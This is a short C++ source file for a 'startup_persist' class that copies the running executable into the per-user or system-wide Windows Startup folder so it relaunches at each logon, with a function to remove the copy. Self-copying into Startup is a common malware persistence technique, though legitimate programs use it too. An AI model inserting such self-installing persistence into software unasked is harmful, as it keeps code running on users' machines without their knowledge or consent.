#include "startup_persist.hpp"

bool startup_persist::installStartup(const std::string& targetName, bool systemWide)
{
    try {
        if (systemWide) {
            startupPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\";
        }
        else {
            startupPath = GetEnv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
        }

        std::string targetPath = startupPath + targetName;

        std::cout << "Attempting to copy file...\n";

        if (fs::copy_file(getCurrentExecutablePath(), targetPath, fs::copy_options::overwrite_existing)) {
            std::cout << "Copy successful!\n";

            auto originalSize = fs::file_size(getCurrentExecutablePath());
            auto copiedSize = fs::file_size(targetPath);

            if (originalSize != copiedSize) {
                return false;
            }

            return true;
        }
        else {
            return false;
        }
    }
    catch (const std::exception& e) {
        std::cout << "Error: " << e.what() << "\n";
    }

    return false;
}

bool startup_persist::removeStartup(const std::string& targetName)
{
    if (!fs::exists(startupPath + targetName)) {
        return false;
    }

    fs::remove(startupPath + targetName);
    return true;
}

std::string startup_persist::GetEnv(const char* varName)
{
    DWORD size = GetEnvironmentVariableA(varName, nullptr, 0);

    if (size == 0) {
        throw std::runtime_error("Environment variable not found");
    }

    std::string value(size, '\0');
    GetEnvironmentVariableA(varName, &value[0], size);
    value.resize(size - 1);

    return value;
}

std::string startup_persist::getCurrentExecutablePath()
{
    char buffer[MAX_PATH];

    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}